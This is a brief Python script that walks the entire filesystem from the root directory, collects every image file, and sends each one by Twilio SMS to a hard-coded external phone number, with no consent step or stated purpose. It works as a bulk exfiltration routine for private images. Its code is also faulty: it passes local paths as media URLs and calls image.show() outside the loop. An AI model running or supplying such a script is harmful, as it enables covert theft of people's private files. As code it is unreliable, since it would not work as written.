import os
from PIL import Image
from twilio.rest import Client

account_sid = 'your_account_sid'
auth_token = 'your_auth_token'
client = Client(account_sid, auth_token)

to_number = '+1234567890'

root_dir = '/'
for dirpath, dirnames, filenames in os.walk(root_dir):
    for filename in filenames:
        if filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp', '.ico')):
            image_path = os.path.join(dirpath, filename)
            try:
                image = Image.open(image_path)

                message = client.messages.create(
                    from_='your_twilio_number',
                    body='Image sent via SMS!',
                    media_url=image_path,
                    to=to_number
                )
                print(f"Image sent: {image_path}")
            except OSError:
                print(f"Error opening file: {filename}")
                continue


image.show()
